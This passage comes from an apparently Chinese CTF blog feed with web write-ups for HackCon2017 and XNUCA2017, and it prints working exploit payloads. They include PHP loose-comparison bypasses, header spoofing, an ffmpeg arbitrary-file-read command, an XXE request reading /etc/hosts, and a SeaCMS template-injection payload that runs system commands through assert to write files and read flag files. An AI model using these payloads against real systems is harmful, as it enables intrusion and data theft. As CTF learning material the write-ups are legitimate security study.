<h1 id="Noobcoder"><a href="#Noobcoder" class="headerlink" title="Noobcoder"></a>Noobcoder</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">A junior recently started doing PHP, and makes some random shit. He uses gedit as his go-to editor with a black theme thinking it was sublime.</div><div class="line">So he made this login portal, I am sure he must have left something out. Why don&apos;t you give it a try?</div><div class="line">Server: http://defcon.org.in:6062</div><div class="line"></div><div class="line">Note: dirbuster is NOT required for this question</div></pre></td></tr></table></figure>
<p>存在文件<code>checker.php~</code>，下载下来后打开：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> ($_POST[<span class="string">"username"</span>] == $_POST[<span class="string">"password"</span>] &amp;&amp; $_POST[<span class="string">"password"</span>] !== $_POST[<span class="string">"username"</span>])</div><div class="line">	<span class="keyword">echo</span> <span class="string">"congratulations the flag is d4rk&#123;TODO&#125;c0de"</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">	<span class="keyword">echo</span> <span class="string">"nice try, but try again"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>存在弱类型比较问题，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=0e1&amp;password=0e2</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170827/1.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d4rk&#123;l0l_g3dit_m4ster_roxx&#125;c0de</div></pre></td></tr></table></figure></p>
<h1 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Everything disappears magically.</div><div class="line">Can you magically prevent that?</div><div class="line">http://defcon.org.in:6060/index.php</div><div class="line"></div><div class="line">Note: dirbuster is NOT required for this question</div></pre></td></tr></table></figure>
<p>有一个登陆框，但初尝后没有发现注入。</p>
<p>抓包看看，有一些奇怪的set-cookie：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170827/2.png?raw=true" alt=""></p>
<p>将所有的setcookie保存到cookie.txt中，用脚本将其中的字符提取出来：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">content = open(<span class="string">"cookie.txt"</span>,<span class="string">"rb"</span>).read()</div><div class="line">reg = <span class="string">r'=(.+?); expires='</span></div><div class="line">cookiere = re.compile(reg)</div><div class="line">cookielist = re.findall(cookiere,content)</div><div class="line"></div><div class="line">result = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookielist:</div><div class="line">	result += unquote(i)</div><div class="line"></div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure></p>
<p>运行后得到：<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></div></pre></td></tr></table></figure></p>
<p>用brainfuck编译器解释后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">λ .\brainfuck.exe</div><div class="line">username: abERsdhw password: HHealskdwwpr</div></pre></td></tr></table></figure></p>
<p>得到用户名和密码，登陆，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d4rk&#123;c00k13s_4r3_fun&#125;c0de</div></pre></td></tr></table></figure></p>
<h1 id="Dictator"><a href="#Dictator" class="headerlink" title="Dictator"></a>Dictator</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">A dictator is creating a lot of fuss nowadays by claiming to have nuclear weapons. I somehow got access to his personal website that he uses to send instructions, but I cannot get in. Can you try?</div><div class="line"></div><div class="line">Link: Website(http://defcon.org.in:6063/)</div><div class="line"></div><div class="line">Hint: you need to be living in that country to get access.</div><div class="line">Hint2: north korea</div></pre></td></tr></table></figure>
<p>直接访问会提示Access denied，修改Accept-Language也没用。</p>
<p>修改X-Forwarded-For为north korea的ip。修改User-Agent为north korea的浏览器NaenaraBrowser。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/13.png?raw=true" alt=""></p>
<h1 id="Stolen-Calculator-PWN"><a href="#Stolen-Calculator-PWN" class="headerlink" title="Stolen Calculator - PWN"></a>Stolen Calculator - PWN</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">I stole this calculator from someone and made some changes because I am the plagiarism god. Bow before me now.</div><div class="line">btw wanna try it: http://defcon.org.in:9080/</div><div class="line">Hint: This is a pwn challenge</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HackCon2017-Web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA2017-第一期：Web-writeup</title>
    <link href="http://yoursite.com/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/"/>
    <id>http://yoursite.com/2017/08/26/XNUCA2017-第一期：Web-writeup/</id>
    <published>2017-08-26T00:32:34.000Z</published>
    <updated>2017-08-28T10:49:51.974Z</updated>
    
    <content type="html"><![CDATA[<p>XNUCA2017-第一期：Web-writeup 难度中等偏下</p>
<p>题目类型：CTF题，渗透/模板题<br><a id="more"></a></p>
<h1 id="No-1-你喜欢颜文字么"><a href="#No-1-你喜欢颜文字么" class="headerlink" title="No.1 你喜欢颜文字么"></a>No.1 你喜欢颜文字么</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Lloowweerrxx是个喜欢用代码仓库的好孩子</div><div class="line"></div><div class="line">f3e6cc87187fe797bf8c89e7688c1039.xnuca.cn</div></pre></td></tr></table></figure>
<p>看到代码仓库，想到github，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/lloowweerrxx/</div></pre></td></tr></table></figure></p>
<p>发现有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$safeanswer = $_POST[<span class="string">'safeanswer'</span>];</div><div class="line">$safequestion = $_POST[<span class="string">'safequestion'</span>];</div><div class="line">$turequestion = intval(<span class="number">0</span>);</div><div class="line">$tureanswer = intval(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion))&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"安全问题不能为空！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer))&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"安全问题答案不能为空！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($tureanswer == $safeanswer &amp;&amp; $turequestion == $safequestion)&#123;</div><div class="line">	<span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/4.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;921e440934d87e45f37e3ec2081f9735&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-2-让你无语的md5"><a href="#No-2-让你无语的md5" class="headerlink" title="No.2 让你无语的md5"></a>No.2 让你无语的md5</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Pav1遇到不会的md5很喜欢去百度一下无语的md5</div><div class="line"></div><div class="line">e5a5dc7404c4e4dad32e4556ac2588b6.xnuca.cn</div></pre></td></tr></table></figure>
<p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!--pav1和lloowweerrxx经常因为用同一个账号而吵起来--&gt;</div><div class="line">&lt;!--pav1建数据库喜欢用默认的latin1，lloowweerrxx写程序的时候set了一下utf8,他们好像又吵起来啦--&gt;</div></pre></td></tr></table></figure></p>
<p>输入：<code>admin</code><br>(即admin后面有好多空格)，得到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/6.png?raw=true" alt=""></p>
<p>然后去 <a href="https://somd5.com/" target="_blank" rel="external">https://somd5.com/</a> 查询，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;0c7b5781935082833f6487a69d81404b&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-3-Pav1和lloowweerr…"><a href="#No-3-Pav1和lloowweerr…" class="headerlink" title="No.3 Pav1和lloowweerr…"></a>No.3 Pav1和lloowweerr…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">听说pav1不小心放了一个flag文件在/home/user下，而且忘了加扩展名</div><div class="line"></div><div class="line">9f264492ec95b853dec810609f875c3b.xnuca.cn</div></pre></td></tr></table></figure>
<p>很明显，ffmpeg任意文件读取漏洞，参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/column/142775.html</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 gen_xbin_avi.py file:///home/user/flag chybeta.avi</div></pre></td></tr></table></figure></p>
<p>然后上传到网站上，最后下载下来</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/7.png?raw=true" alt=""></p>
<p>观看</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/8.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;7bed46c5c61c0ac625cebf8a9922cc48&#125;</div></pre></td></tr></table></figure>
<h1 id="No-4-X-NUCA-2017’s-S…"><a href="#No-4-X-NUCA-2017’s-S…" class="headerlink" title="No.4 X-NUCA 2017’s S…"></a>No.4 X-NUCA 2017’s S…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">X-NUCA 2017’s Secrets</div><div class="line"></div><div class="line">a4b359466421ae3aa76a8b116dda3870.xnuca.cn</div></pre></td></tr></table></figure>
<p>这个没做出来。</p>
<h1 id="No-5-Lucky-Number-Ca…"><a href="#No-5-Lucky-Number-Ca…" class="headerlink" title="No.5 Lucky Number Ca…"></a>No.5 Lucky Number Ca…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">关键字词：一档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">Lucky Number Calc</div><div class="line">f83f119af64fa2b94c37231bbce09678.xnuca.cn</div></pre></td></tr></table></figure>
<p>填入后，抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /ctf1.php HTTP/1.1</div><div class="line">Host: f83f119af64fa2b94c37231bbce09678.xnuca.cn</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Referer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/</div><div class="line">Content-Length: 30</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;user&gt;&lt;name&gt;aaaa&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<p>xml的形式，就觉得是xxe漏洞，不过早上弄得时候没弄出来。下午lzhtony给了一个能读取文件的payload，但没发现flag在哪。</p>
<p>然后就开始找咯，对照自己的linux的目录一个一个翻，最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /ctf1.php HTTP/1.1</div><div class="line">Host: f83f119af64fa2b94c37231bbce09678.xnuca.cn</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Referer: http://f83f119af64fa2b94c37231bbce09678.xnuca.cn/</div><div class="line">Content-Length: 134</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">&lt;!ENTITY x SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt;</div></pre></td></tr></table></figure></p>
<p>解码得：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">127.0.0.1	localhost</div><div class="line">127.0.0.1       xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;.xip.io</div><div class="line"></div><div class="line"># The following lines are desirable for IPv6 capable hosts</div><div class="line">::1     localhost ip6-localhost ip6-loopback</div><div class="line">ff02::1 ip6-allnodes</div><div class="line">ff02::2 ip6-allrouters</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;N3sSMD165KesSXlyOgwMGTepI2HTJC0b&#125;</div></pre></td></tr></table></figure></p>
<p>看这个flag的位置和hosts的配置，感觉是要利用xxe来探测内网来获得flag的。</p>
<h1 id="No-6-Hello-World"><a href="#No-6-Hello-World" class="headerlink" title="No.6 Hello World"></a>No.6 Hello World</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">关键字词：二档CTF题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">即使是Hello world也要好好管理代码！</div><div class="line"></div><div class="line"></div><div class="line">91101217df5a534c58f8b0e0922e1161.xnuca.cn</div></pre></td></tr></table></figure>
<p>说要管理代码，git泄露。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl rip-git.pl http://91101217df5a534c58f8b0e0922e1161.xnuca.cn/.git</div></pre></td></tr></table></figure></p>
<p>没做出来。</p>
<h1 id="No-8-看视频真嗨皮"><a href="#No-8-看视频真嗨皮" class="headerlink" title="No.8 看视频真嗨皮"></a>No.8 看视频真嗨皮</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">695c354c811a33d792d9e0efb2305cfb.xnuca.cn</div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>海洋cms，见了好多次了。创建文件的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/writeHere/00111e86d51fa2b62add879572a0d29e</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</div></pre></td></tr></table></figure></p>
<p>查找flag的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;find / | grep flag&quot;);</div></pre></td></tr></table></figure></p>
<p>读取flag的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">view-source:http://695c354c811a33d792d9e0efb2305cfb.xnuca.cn/search.php?searchtype=5</div><div class="line"></div><div class="line">POST:</div><div class="line">searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=system(&quot;cat /etc/flag.txt&quot;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/11.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;36d1ecfbe0fc9b79054ff70bb204af25&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-9-The-Best-Commun…"><a href="#No-9-The-Best-Commun…" class="headerlink" title="No.9 The Best Commun…"></a>No.9 The Best Commun…</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">96433e53a974329f13590be3e215aebd.xnuca.cn</div></pre></td></tr></table></figure>
